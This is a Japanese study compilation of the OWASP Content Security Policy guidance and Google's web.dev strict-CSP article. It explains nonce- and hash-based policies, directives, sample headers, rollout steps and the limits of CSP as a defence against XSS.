#### 3. Content-Security-Policy Meta Tag

- ヘッダが自分の制御下にない CDN に HTML ファイルをデプロイしている場合など、`Content-Security-Policy` ヘッダを使えないことがある。その場合でも HTML マークアップ内で `http-equiv` meta タグを指定して CSP を使える。

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

- ほぼすべて（完全な XSS 防御を含む）が依然サポートされる。**ただし、framing protections（`frame-ancestors`）、sandboxing（`sandbox`）、CSP violation logging endpoint（`report-to`）は使えない。**

#### WARNING

- **`X-Content-Security-Policy` や `X-WebKit-CSP` を使ってはならない（DO NOT）。** それらの実装は obsolete（Firefox 23 以降、Chrome 25 以降）、限定的、非一貫的で、信じられないほどバグが多い（incredibly buggy）。

### 2.4 CSP Types（granular/allowlist based or strict）

- CSP 構築の**元来の機構**は、HTML ページのコンテキストで許可されるコンテンツとソースを定義する **allow-list（許可リスト）**を作るものだった。
- **しかし現在の leading practice は "Strict" CSP を作ること**。これは展開がはるかに容易で、**バイパスされる可能性が低いためより安全**。

### 2.5 Strict CSP

- Strict CSP は、後述の **Fetch Directives のうち限られた数のもの**と、次の2つの機構のいずれかを組み合わせて作れる。
  - Nonce based
  - Hash based
- **`strict-dynamic` ディレクティブを任意で併用することで Strict CSP の実装がより容易になる。**
- 以下の各節は基本的な指針を提供するが、**Google の詳細で方法論的な手順に従うことを強く推奨**する: **[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)**

#### 2.5.1 Nonce based

- nonce は**HTTP レスポンスごとに生成する一意の使い捨てランダム値**で、`Content-Security-Policy` ヘッダに追加する。

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

- この nonce をビューに渡し（nonce の利用は**静的でない HTML を必要とする**）、次のような script タグをレンダリングする。

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

**Warning（逐語の警告）**:
- **すべての script タグを "script nonce=..." に置換するミドルウェアを作ってはならない（Don't）。** そんなことをすると**攻撃者が注入したスクリプトにも nonce が付いてしまう**。nonce を使うには**実際の HTML テンプレートエンジンが必要**。

#### 2.5.2 Hashes

- インラインスクリプトが必要な場合、`script-src 'hash_algo-hash'` は特定のスクリプトのみ実行を許可するもう一つの選択肢。

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

- ハッシュを得るには、Google Chrome の developer tools で次のような違反を見る（逐語）:

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...

- [hash generator](https://report-uri.com/home/hash) も使える。ハッシュ利用の good example は https://csp.withgoogle.com/docs/faq.html#static-content 。

**Note（逐語の注意）**:
- **ハッシュの利用はリスクのあるアプローチになりうる。** script タグの中身を*何か*（**空白すら**）変更すると、たとえばコードをフォーマットしただけでも**ハッシュが変わってスクリプトがレンダリングされなくなる**。

#### 2.5.3 strict-dynamic

- `strict-dynamic` ディレクティブは、**hash または nonce のいずれかと組み合わせて** Strict CSP の一部として使える。
- **正しい hash または nonce を持つスクリプトブロックが追加の DOM 要素を作成しその中で JS を実行する場合、`strict-dynamic` はそれらの要素も信頼するようブラウザに伝える** — 各要素に明示的に nonce や hash を追加する必要がなくなる。
- `strict-dynamic` は **CSP level 3 の機能**だが、CSP level 3 は一般的なモダンブラウザで非常に広くサポートされている。
- 詳細は [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage)。

### 2.6 Detailed CSP Directives（詳細なディレクティブ一覧）

- 開発者がポリシーの流れを細粒度に制御できる複数の種類のディレクティブが存在する。**注意: 細粒度すぎる、あるいは許可が緩すぎる非 Strict なポリシーを作ると、バイパスと保護の喪失につながりやすい。**

#### 2.6.1 Fetch Directives（フェッチ系ディレクティブ）

- Fetch ディレクティブは、ブラウザに**信頼してリソースを読み込む場所**を伝える。
- ほとんどの fetch ディレクティブは w3 で規定された **fallback list**（https://www.w3.org/TR/CSP3/#directive-fallback-list ）を持つ。このリストによってスクリプト・画像・ファイル等のソースを細粒度に制御できる。

| ディレクティブ | 原文の説明（訳） |
|---|---|
| `child-src` | ネストしたブラウジングコンテキストと worker 実行コンテキストを制御できる。 |
| `connect-src` | fetch リクエスト、XHR、eventsource、beacon、websockets 接続を制御する。 |
| `font-src` | フォントを読み込む URL を指定する。 |
| `img-src` | 画像を読み込める URL を指定する。 |
| `manifest-src` | アプリケーションマニフェストを読み込める URL を指定する。 |
| `media-src` | video、audio、text track リソースを読み込める URL を指定する。 |
| `prefetch-src` | prefetch/prerender リソース URL 用の**実験的**ディレクティブだった。**CSP Level 3 仕様から削除され**、モダンブラウザでは無視される — **防御目的で依存してはならない**。代わりに標準の fetch ディレクティブで script/style/default fetch を制約する。 |
| `object-src` | プラグインを読み込める URL を指定する。 |
| `script-src` | スクリプトを実行できる場所を指定する。**他の script 系ディレクティブのフォールバックディレクティブ**である。 |
| `script-src-elem` | script リクエストおよびブロックの実行が起こりうる場所を制御する。 |
| `script-src-attr` | **イベントハンドラの実行**を制御する。 |
| `style-src` | ドキュメントにスタイルが適用される場所を制御する。`<link>` 要素、`@import` ルール、`Link` HTTP レスポンスヘッダフィールド由来のリクエストを含む。 |
| `style-src-elem` | インライン属性を除くスタイルを制御する。 |
| `style-src-attr` | スタイル属性を制御する。 |
| `default-src` | 他の fetch ディレクティブのフォールバックディレクティブ。**指定されたディレクティブは継承しないが、指定されなかったディレクティブは `default-src` の値にフォールバックする。** |

#### 2.6.2 Document Directives（ドキュメント系ディレクティブ）

- Document ディレクティブは、ポリシーが適用されるドキュメントの性質についてブラウザに指示する。

| ディレクティブ | 説明 |
|---|---|
| `base-uri` | `<base>` 要素が使用できる URL を指定する。 |
| `plugin-types` | ドキュメントに読み込めるリソースの**種類（type）**を制限する（*例* `application/pdf`）。対象要素 `<embed>` と `<object>` には3つのルールが適用される: (1) 要素は自分の type を明示的に宣言する必要がある。(2) 要素の type は宣言された type と一致する必要がある。(3) 要素のリソースは宣言された type と一致する必要がある。 |
| `sandbox` | フォーム送信などページの動作を制限する。**リクエストヘッダ `Content-Security-Policy` と共に使う場合のみ適用される。** ディレクティブに値を指定しない場合、**sandbox の制限すべてが有効化される**: `Content-Security-Policy: sandbox;` 。Sandbox syntax は MDN 参照。 |

#### 2.6.3 Navigation Directives（ナビゲーション系ディレクティブ）

- Navigation ディレクティブは、ドキュメントがナビゲートできる場所、または埋め込まれてよい場所についてブラウザに指示する。

| ディレクティブ | 説明 |
|---|---|
| `form-action` | フォームが送信できる URL を制限する。 |
| `frame-ancestors` | 要求されたリソースを `<frame>`, `<iframe>`, `<object>`, `<embed>`, `<applet>` 要素の内部に埋め込める URL を制限する。**(1) `<meta>` タグで指定された場合このディレクティブは無視される。(2) このディレクティブは `default-src` にフォールバックしない。(3) `X-Frame-Options` はこのディレクティブによって obsolete となり、UA によって無視される。** |

#### 2.6.4 Reporting Directives（レポート系ディレクティブ）

- Reporting ディレクティブは、防止された挙動の違反を指定された場所へ配送する。**これらのディレクティブは単独では意味を持たず、他のディレクティブに依存する。**

| ディレクティブ | 説明 |
|---|---|
| `report-to` | CSP Level 3、Reporting API と共に使用。**主要かつ現行のレポートディレクティブ**。`Reporting-Endpoints`（またはレガシーな `Report-To`）レスポンスヘッダで定義されたグループ名を参照する。そのヘッダには JSON 形式のエンドポイントリストが入る。 |
| `report-uri` | **CSP Level 3 で `report-to` に置き換えられ deprecated**。レポート送信先の URI を取る。書式: `Content-Security-Policy: report-uri https://example.com/csp-reports` |

- **後方互換性のため、両ディレクティブを併記して宣言する。** `report-to` をサポートするブラウザはそれを使い `report-uri` を無視する。古いブラウザは `report-uri` にフォールバックする。レガシーブラウザのサポートが不要になったら `report-uri` は削除できる。

#### 2.6.5 Special Directive Sources（特別なディレクティブソース — 原文の表を完全再現）

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |

- ディレクティブソースの動作をより理解するには w3c の source lists（https://w3c.github.io/webappsec-csp/#framework-directive-source-list ）を参照。

### 2.7 CSP Sample Policies（サンプルポリシー — 逐語）

#### 2.7.1 Strict Policy

- strict policy の役割は、**古典的な stored XSS、reflected XSS、および一部の DOM XSS 攻撃**から保護すること。**CSP を実装しようとするあらゆるチームの最適な目標であるべき**。
- 前述のとおり Google が Strict CSP 作成の詳細かつ方法論的な手順（https://web.dev/strict-csp ）を用意している。その手順に基づき、次の2つのポリシーのいずれかで strict policy を適用できる。

**Nonce-based Strict Policy**

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

**Hash-based Strict Policy**

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### 2.7.2 Basic non-Strict CSP Policy

- Strict Policy を作れない場合に使えるポリシーで、**cross-site framing と cross-site form-submission を防ぐ**。すべての default レベルディレクティブについて元のドメインからのリソースのみを許可し、インライン script/style の実行を許可しない。
- アプリがこの制約下で動くなら、**攻撃面を劇的に削減**でき、ほとんどのモダンブラウザで動作する。

最も基本的なポリシーの前提:
- すべてのリソースがドキュメントと同じドメインでホストされている。
- script と style リソースについてインラインも eval も存在しない。
- 他の Web サイトが当サイトをフレームする必要がない。
- 外部サイトへのフォーム送信がない。

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

さらに締めるには次を適用できる:

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

- このポリシーは同一オリジンからの画像・スクリプト・AJAX・CSS を許可し、それ以外のリソース（object、frame、media など）は一切読み込ませない。

#### 2.7.3 Upgrading insecure requests

- HTTP から HTTPS に移行中の場合、次のディレクティブですべてのリクエストが HTTPS で送られ、HTTP へのフォールバックがなくなる。

```text
Content-Security-Policy: upgrade-insecure-requests;
```

#### 2.7.4 Preventing framing attacks（clickjacking, cross-site leaks）

- コンテンツのフレーミングをすべて防ぐには: `Content-Security-Policy: frame-ancestors 'none';`
- サイト自身には許可するには: `Content-Security-Policy: frame-ancestors 'self';`
- 信頼するドメインに許可するには: `Content-Security-Policy: frame-ancestors trusted.com;`

#### 2.7.5 Refactoring inline code（インラインコードのリファクタリング）

- `default-src` または `script-src*` ディレクティブが有効なとき、CSP は既定で HTML ソース内にインラインで置かれたあらゆる JavaScript コードを無効化する。たとえば次のようなもの（原文のコードブロックをそのまま再現。原文には閉じタグの typo があるが逐語で記録する）:

```javascript
<script>
var foo = "314"
<script>
```

- インラインコードは別の JavaScript ファイルに移し、ページ内のコードは次のようになる:

```javascript
<script src="app.js">
</script>
```

`app.js` が `var foo = "314"` のコードを含む。

- **インラインコードの制限は `inline event handlers` にも適用される**ので、次の構成は CSP 下でブロックされる:

```html
<button id="button1" onclick="doSomething()">
```

- これは `addEventListener` 呼び出しに置き換えるべき:

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

### 2.8 References（原文の参照リスト・逐語）

- [Strict CSP](https://web.dev/strict-csp)
- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
- [Content-Security-Policy](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
- CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
- [CSP evaluator](https://csp-evaluator.withgoogle.com/)

---

# 第3部（補助資料）: strict CSP の具体的な導入手順 （出典: https://web.dev/strict-csp/ — 担当URLではないが、両担当URLが明示的に参照している一次資料）

原稿メタデータ: `title: Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)` / `authors: lwe` / `date: 2021-03-15` / `updated: 2023-06-10`

### 3.1 なぜ strict CSP を展開すべきか

- XSS（悪意あるスクリプトを Web アプリに注入する能力）は10年以上にわたり最大の Web セキュリティ脆弱性の1つ。
- CSP は XSS の緩和を助ける**追加のセキュリティ層**。設定は `Content-Security-Policy` HTTP ヘッダを Web ページに追加し、そのページに対して UA が読み込みを許されるリソースを制御する値を設定すること。
- この記事は、よく使われる**ホスト許可リストベースの CSP（多くの構成でバイパス可能でページを XSS に晒したままにする）ではなく、nonce または hash ベースの CSP** で XSS を緩和する方法を説明する。バイパス可能性の根拠論文: https://research.google.com/pubs/pub45542.html
- 用語（原文 key-term）:
  - **nonce** = 一度だけ使われるランダムな数値。`<script>` タグを信頼済みとしてマークするのに使える。
  - **hash function** = 入力値を圧縮された数値（ハッシュ）に変換する数学的関数。**hash**（`SHA-256` など）はインライン `<script>` タグを信頼済みとしてマークするのに使える。
- nonce または hash に基づく CSP はしばしば **strict CSP** と呼ばれる。アプリが strict CSP を使っていると、HTML 注入の欠陥を見つけた攻撃者は、**一般にそれを使って脆弱なドキュメントのコンテキストでブラウザに悪意あるスクリプトを実行させることはできない**。strict CSP はハッシュされたスクリプトか、**サーバー上で生成された正しい nonce 値を持つスクリプトのみ**を許可するため、攻撃者は当該レスポンスの正しい nonce を知らなければスクリプトを実行できない。
- サイトを XSS から守るには、**ユーザー入力のサニタイズ*と*追加のセキュリティ層としての CSP の両方**を行うこと。CSP は defense-in-depth の技術で悪意あるスクリプトの実行を防げるが、**XSS バグを避けること（および速やかに直すこと）の代替ではない**。

### 3.2 Browser compatibility

- strict CSP は**すべてのモダンブラウザエンジンでサポート**されている（原文は `http.headers.Content-Security-Policy.strict-dynamic` の BrowserCompat テーブルを埋め込んでいる）。

### 3.3 なぜ allowlist CSP より strict CSP が推奨されるのか

- サイトがすでに `script-src www.googleapis.com` のような CSP を持っている場合、**それは XSS に対して有効でない可能性がある**。この種の CSP は **allowlist CSP** と呼ばれ、2つの欠点がある。
  - **多くのカスタマイズを必要とする。**
  - **ほとんどの構成でバイパスできる。**
- このため allowlist CSP は一般に、攻撃者が XSS を悪用するのを防ぐ上で実効性がない。だからこそ暗号学的 nonce または hash に基づく **strict CSP** が推奨される。

原文の比較（逐語）:

| Allowlist CSP（worse） | Strict CSP（better） |
|---|---|
| Doesn't effectively protect your site. ❌ | Effectively protects your site. ✅ |
| Must be highly customized. 😓 | Always has the same structure. 😌 |

### 3.4 strict CSP とは何か — 推奨形（逐語）

**Nonce-based strict CSP**

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

**Hash-based strict CSP**

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

- 警告（原文 Aside warning）: **これは strict CSP の最も削ぎ落とした版**。ブラウザ横断で有効にするには調整が必要（Safari と古いブラウザ向けのフォールバック追加を参照）。

上のような CSP を "strict"（ゆえに安全）にしている性質（原文逐語ベース）:
- nonce `'nonce-{RANDOM}'` または hash `'sha256-{HASHED_INLINE_SCRIPT}'` を使って、**どの `<script>` タグがサイト開発者に信頼されており、ユーザーのブラウザで実行を許すべきか**を示す。
- **`'strict-dynamic'`**（https://www.w3.org/TR/CSP3/#strict-dynamic-usage ）を設定して、**すでに信頼されたスクリプトによって作られたスクリプトの実行を自動的に許可**することで、nonce/hash ベース CSP 展開の労力を減らす。これは**ほとんどの第三者 JavaScript ライブラリやウィジェットの利用も解禁する**。
- **URL 許可リストに基づかない**ため、一般的な CSP バイパスの影響を受けない。
- インラインイベントハンドラや `javascript:` URI のような**信頼されないインラインスクリプトをブロック**する。
- **`object-src` を制限**して Flash などの危険なプラグインを無効化する。
- **`base-uri` を制限**して `<base>` タグの注入をブロックする。これにより**攻撃者が相対 URL から読み込まれるスクリプトの位置を変更するのを防ぐ**。
- もう一つの利点: strict CSP は**常に同じ構造**で、アプリごとにカスタマイズする必要がない。

### 3.5 strict CSP の採用手順（5ステップ）

採用に必要なこと（原文逐語ベース）:
1. アプリが nonce ベースか hash ベースの CSP を設定すべきかを決める。
2. 「What is a strict Content Security Policy」節の CSP をコピーし、アプリ全体でレスポンスヘッダとして設定する。
3. CSP と非互換なパターンを取り除くため HTML テンプレートとクライアントサイドコードをリファクタリングする。
4. CSP を展開する。

- このプロセス全体を通じて **Lighthouse**（v7.3.0 以上、フラグ `--preset=experimental`）の **Best Practices** 監査を使い、サイトに CSP があるか、そして XSS に対して有効なほど strict かを確認できる。Lighthouse のレポート警告例: "no CSP is found in enforcement mode"。

#### Step 1: nonce ベースか hash ベースかを決める

- **Nonce-based CSP**: **実行時**にランダムな数値を生成し、CSP に含め、ページの全 script タグに関連付ける。攻撃者はそのスクリプト用の正しいランダム数値を推測しなければならないので、悪意あるスクリプトを含めて実行できない。**これは数値が推測不能で、レスポンスごとに実行時に新規生成される場合にのみ機能する。**
- **Hash-based CSP**: すべてのインライン script タグのハッシュを CSP に追加する。**各スクリプトは異なるハッシュを持つ**点に注意。攻撃者は自分のスクリプトのハッシュが CSP に存在する必要があるため、悪意あるスクリプトを含めて実行できない。

strict CSP アプローチ選択の基準（原文の表を再現）:

| | 説明 |
|---|---|
| **Nonce-based CSP** | For HTML pages rendered on the server where you can create a new random token (nonce) for every response.（レスポンスごとに新しいランダムトークンを作れる、サーバーでレンダリングされる HTML ページ向け） |
| **Hash-based CSP** | For HTML pages served statically or those that need to be cached. For example, single-page web applications built with frameworks such as Angular, React or others, that are statically served without server-side rendering.（静的配信またはキャッシュが必要な HTML ページ向け。例: Angular、React などのフレームワークで構築され、SSR なしで静的配信される SPA） |

#### Step 2: strict CSP を設定しスクリプトを準備する

設定時の選択肢:
- **Report-only モード（`Content-Security-Policy-Report-Only`）か enforcement モード（`Content-Security-Policy`）**。report-only ではまだリソースをブロックしない（何も壊れない）が、ブロックされるはずだったものについてエラーとレポートを見られる。ローカルで CSP を設定している最中はどちらのモードもブラウザコンソールにエラーを表示するのであまり関係ない。**むしろ enforcement モードの方が、ページが壊れて見えるのでブロックされたリソースを見て CSP を調整しやすい**。Report-only モードはプロセスの後半（Step 5）で最も有用になる。
- **ヘッダか HTML `<meta>` タグか**。ローカル開発では `<meta>` タグの方が CSP を調整してサイトへの影響を素早く見るのに便利かもしれない。ただし:
  - 後に本番で CSP を展開する際は **HTTP ヘッダとして設定することが推奨**。
  - **CSP を report-only モードで設定したいならヘッダとして設定する必要がある — CSP meta タグは report-only モードをサポートしない。**

**Option A: Nonce-based CSP**

アプリで次の `Content-Security-Policy` HTTP レスポンスヘッダを設定する:

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

- 注意（原文 caution）: **`{RANDOM}` プレースホルダは、サーバーのレスポンスごとに再生成される*ランダムな* nonce に置き換えること。**

**CSP 用 nonce の生成** — nonce はページ読み込みごとに一度だけ使うランダムな数値。nonce ベース CSP が XSS を緩和できるのは、**nonce 値が攻撃者に推測不能な場合のみ**。CSP 用 nonce に必要な条件（逐語）:
- A cryptographically **strong random** value (ideally 128+ bits in length)（暗号学的に強いランダム値、理想的には128ビット以上の長さ）
- Newly **generated for every response**（レスポンスごとに新規生成）
- Base64 encoded（Base64 エンコード）

サーバーサイドフレームワークでの CSP nonce 追加例:
- Django (python): https://django-csp.readthedocs.io/en/latest/nonce.html
- Express (JavaScript)（逐語）:

```javascript
const app = express();
app.get('/', function(request, response) {
    // Generate a new random nonce value for every response.
    const nonce = crypto.randomBytes(16).toString("base64");
    // Set the strict nonce-based CSP response header
    const csp = `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none';`;
    response.set("Content-Security-Policy", csp);
    // Every <script> tag in your application should set the `nonce` attribute to this value.
    response.render(template, { nonce: nonce });
  });
}
```

**`<script>` 要素への `nonce` 属性の追加** — nonce ベース CSP では、すべての `<script>` 要素が CSP ヘッダで指定したランダム nonce 値と一致する `nonce` 属性を持たなければならない（**全スクリプトが同じ nonce を持ってよい**）。

CSP にブロックされる例（nonce 属性がないため）:

```html
<script src="/path/to/script.js"></script>
<script>foo()</script>
```

CSP に許可される例（`${NONCE}` が CSP レスポンスヘッダの nonce と一致する値に置換されている場合）:

```html
<script nonce="${NONCE}" src="/path/to/script.js"></script>
<script nonce="${NONCE}">foo()</script>
```

- 注意: **一部のブラウザはページソースを検査するとき `nonce` 属性を隠す。**
- gotcha（原文逐語ベース）: **CSP に `'strict-dynamic'` があれば、初期 HTML レスポンスに存在する `<script>` タグにだけ nonce を付ければよい。** `'strict-dynamic'` は、安全ですでに信頼されたスクリプトによって読み込まれた限り、動的にページに追加されたスクリプトの実行を許可する（仕様: https://www.w3.org/TR/CSP3/#strict-dynamic-usage ）。

**Option B: Hash-based CSP Response Header**

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

- 複数のインラインスクリプトがある場合の文法は次のとおり: `'sha256-{HASHED_INLINE_SCRIPT_1}'  'sha256-{HASHED_INLINE_SCRIPT_2}'`
- 注意（原文 caution）: `{HASHED_INLINE_SCRIPT}` プレースホルダは、**他のスクリプトを読み込むのに使えるインラインスクリプトの base64 エンコードされた SHA-256 ハッシュ**に置き換えなければならない。静的なインライン `<script>` ブロックの SHA ハッシュは https://strict-csp-codelab.glitch.me/csp_sha256_util.html で計算できる。代替として、**Chrome の developer console の CSP 違反警告にブロックされたスクリプトのハッシュが含まれる**ので、それを `'sha256-…'` としてポリシーに追加する。攻撃者が注入したスクリプトはブラウザにブロックされる（ハッシュされたインラインスクリプトと、それが動的に追加したスクリプトだけが実行を許される）。

**外部スクリプトを動的に読み込む** — 外部ソースのスクリプトはすべて**インラインスクリプト経由で動的に読み込む**必要がある。というのも **CSP ハッシュはブラウザ横断ではインラインスクリプトについてのみサポート**されており、sourced script のハッシュはブラウザ間で十分にサポートされていない。

CSP にブロックされる例（インラインスクリプトのみハッシュ可能なため）:

```html
<script src="https://example.org/foo.js"></script>
<script src="https://example.org/bar.js"></script>
```

CSP に許可される例（このインラインスクリプトのハッシュを計算して CSP ヘッダの `{HASHED_INLINE_SCRIPT}` に置き換える）:

```html
<script>
var scripts = [ 'https://example.org/foo.js', 'https://example.org/bar.js'];
scripts.forEach(function(scriptUrl) {
  var s = document.createElement('script');
  s.src = scriptUrl;
  s.async = false; // to preserve execution order
  document.head.appendChild(s);
});
</script>
```

- ハッシュの数を減らすため、すべてのインラインスクリプトを1つのスクリプトにマージしてもよい。
- gotcha: **インラインスクリプトの CSP ハッシュを計算するとき、開始 `<script>` タグと終了 `</script>` タグの間の空白文字が影響する。**

**スクリプト読み込みに関する考慮点**:
- 上のスニペットの `s.async = false` は、（bar が先に読み込まれても）foo が bar より先に実行されることを保証するため。**このスニペットでは `s.async = false` はスクリプト読み込み中にパーサーをブロックしない** — スクリプトが動的に追加されているため。パーサーは `async` スクリプトと同様、スクリプトが実行されるときにのみ止まる。
- 片方または両方のスクリプトが**ドキュメントのダウンロード完了前に実行される可能性がある**。スクリプト実行時にドキュメントが準備済みであってほしい場合は、スクリプトを append する前に `DOMContentLoaded` イベントを待つ必要がある。それがパフォーマンス問題を起こす場合（スクリプトのダウンロード開始が十分早くないため）、ページのより早い位置で **preload タグ**を使える。
- **`defer = true` は何もしない。** その挙動が必要なら、実行したいタイミングで手動でスクリプトを走らせる必要がある。

#### Step 3: CSP 非互換パターンを取り除くリファクタリング

- インラインイベントハンドラ（`onclick="…"`, `onerror="…"` など）と JavaScript URI（`<a href="javascript:…">`）はスクリプト実行に使える。つまり XSS バグを見つけた攻撃者はこの種の HTML を注入して悪意ある JavaScript を実行できる。**nonce/hash ベース CSP はそうしたマークアップの使用を禁止する。** サイトが上記パターンを使っている場合、より安全な代替にリファクタリングする必要がある。
- 前のステップで CSP を有効化していれば、CSP が非互換パターンをブロックするたびにコンソールで CSP 違反を確認できる。

**インラインイベントハンドラのリファクタリング** — JavaScript ブロックから追加するよう書き換える。

ブロックされる:

```html
<span onclick="doThings();">A thing.</span>
```

許可される:

```html
<span id="things">A thing.</span>
<script nonce="${nonce}">
  document.getElementById('things')
          .addEventListener('click', doThings);
</script>
```

**`javascript:` URI も同様のパターン**

ブロックされる:

```html
<a href="javascript:linkClicked()">foo</a>
```

許可される:

```html
<a id="foo">foo</a>
<script nonce="${nonce}">
  document.getElementById('foo')
          .addEventListener('click', linkClicked);
</script>
```

**JavaScript での `eval()` の使用**
- アプリが JSON 文字列のシリアライズを JS オブジェクトに変換するのに `eval()` を使っている場合、`JSON.parse()` にリファクタリングすべき（**そちらの方が速い** — https://v8.dev/blog/cost-of-javascript-2019#json ）。
- `eval()` の使用をすべて取り除けない場合でも strict な nonce ベース CSP を設定できるが、**`'unsafe-eval'` CSP キーワードを使う必要があり、ポリシーはわずかに安全性が落ちる**。
- これらのリファクタリング例は strict CSP Codelab（Glitch `strict-csp-codelab`、`demo/solution_nonce_csp.html`）で見られる。

#### Step 4（任意）: 古いブラウザバージョン向けフォールバックの追加

- 注意（原文 caution）: strict CSP（特に `'strict-dynamic'` キーワード）は**すべてのブラウザエンジンでサポート**されているため、**古いブラウザバージョンのユーザーをサポートする必要がない限り CSP にフォールバックを追加する必要はない**。モダンブラウザではフォールバックを設定してもポリシーの安全性は下がらないが、**多くの開発者が複雑な CSP フォールバック機構に慣れていないため混乱を招きうる**。
- 上記より古いブラウザバージョンをサポートする必要がある場合:
  - **`'strict-dynamic'` を使うには、古い Safari 向けのフォールバックとして `https:` を追加する必要がある。** そうすることで:
    - `'strict-dynamic'` をサポートするすべてのブラウザは `https:` フォールバックを無視するので、**ポリシーの強度は下がらない**。
    - 古いブラウザでは、外部ソースのスクリプトは **HTTPS オリジンから来る場合のみ読み込みが許可される**。これは strict CSP より安全性が低いが（フォールバックなので）、`'unsafe-inline'` が存在しない、あるいは hash/nonce の存在下で無視されるため、**`javascript:` URI の注入のような一般的な XSS 原因は依然として防げる**。
  - **非常に古いブラウザバージョン（4年以上前）との互換性を確保するには `'unsafe-inline'` をフォールバックとして追加できる。** 最近のすべてのブラウザは、**CSP nonce または hash が存在する場合 `'unsafe-inline'` を無視する**。

```text
Content-Security-Policy:
  script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
```

- `https:` と `unsafe-inline` は、`strict-dynamic` をサポートするすべてのモダンブラウザで無視されるので**ポリシーの安全性を下げない**。

#### Step 5: CSP の展開

- ローカル開発環境で正当なスクリプトが CSP にブロックされていないことを確認したら、（ステージング、次に）本番環境への展開に進む。
1. （任意）`Content-Security-Policy-Report-Only` ヘッダで report-only モードで展開する（Reporting API を参照）。**Report-only モードは、実際に CSP 制約を強制する前に、新しい CSP のような破壊的変更を本番でテストするのに便利。** report-only モードでは CSP はアプリの挙動に影響しない（実際には何も壊れない）が、ブラウザは CSP 非互換パターンに遭遇したときコンソールエラーと違反レポートを生成する（エンドユーザーにとって何が壊れたはずかを見られる）。
2. CSP がエンドユーザーに破壊をもたらさないと確信できたら、`Content-Security-Policy` レスポンスヘッダで展開する。**このステップを完了して初めて CSP がアプリを XSS から保護し始める。** CSP をサーバーサイドの HTTP ヘッダ経由で設定する方が `<meta>` タグとして設定するより安全。可能ならヘッダを使う。
- gotcha: 使っている CSP が本当に "strict" かどうかを **CSP Evaluator（https://csp-evaluator.withgoogle.com ）または Lighthouse** で確認すること。**ポリシーのわずかな変更でもセキュリティが大幅に下がりうるので非常に重要。**
- caution: **本番トラフィックで CSP を有効にすると、ブラウザ拡張やマルウェアに起因するノイズが CSP 違反レポートに現れることがある。**

### 3.6 Limitations（strict CSP でも守れないケース — 診断時の最重要リスト）

一般的に strict CSP は XSS の緩和に役立つ強力な追加セキュリティ層を提供する。ほとんどの場合、CSP は攻撃面を著しく削減する（`javascript:` URI のような危険なパターンは完全にオフになる）。**しかし、使っている CSP の種類（nonce、hash、`'strict-dynamic'` 有無）によっては CSP が保護しないケースがある**（原文逐語ベース）:

- **スクリプトに nonce を付けているが、その `<script>` 要素の body 内または `src` パラメータに直接注入がある場合。**
- **動的に作られるスクリプト（`document.createElement('script')`）の位置（locations）に注入がある場合。** 引数の値に基づいて `script` DOM ノードを作るあらゆるライブラリ関数も含む。これには **jQuery の `.html()`**、および **jQuery < 3.0 の `.get()` と `.post()`** のような一般的な API が含まれる。
- **旧 AngularJS アプリでテンプレート注入がある場合。** AngularJS テンプレートを注入できる攻撃者はそれを使って任意の JavaScript を実行できる。
- **ポリシーが `'unsafe-eval'` を含む場合、`eval()`、`setTimeout()`、その他いくつかのあまり使われない API への注入。**
